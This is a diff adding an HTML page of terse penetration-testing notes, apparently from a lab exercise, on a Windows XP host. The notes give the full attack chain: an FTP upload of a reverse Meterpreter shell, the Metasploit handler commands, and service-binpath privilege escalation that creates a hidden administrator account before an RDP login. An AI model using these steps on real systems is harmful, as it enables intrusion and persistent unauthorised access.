@@ -1,0 +1,36 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.13  Bob windows xp</title>
+</head><body>Hostname = bob?<br/>
+<br/>
+<br/>
+you can upload to the /Scripts folder through ftp<br/>
+upload a reverse metepreter shell<br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+Then open msfconsole<br/>
+use exploit/multi/handler<br/>
+set payload windows/meterpreter/reverse_tcp<br/>
+<br/>
+and run the reverse shell<br/>
+<br/>
+<img src="screenshot 3.png" /><br/>
+<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+once connected you can use the upnphost command at the command line to priv esc<br/>
+<br/>
+sc config upnphost binpath= "C:\windows\system32\net user installer2 password3$ /add"<br/>
+net start upnphost <br/>
+sc config upnphost binpath= "C:\windows\system32\net localgroup administrators installer2 /add"<br/>
+net start upnphost <br/>
+<br/>
+<img src="screenshot 4.png" /><br/>
+<br/>
+then login with RDP and newly created account<br/>
+<br/>
+<img src="screenshot 5.png" /><br/>
+</body></html>
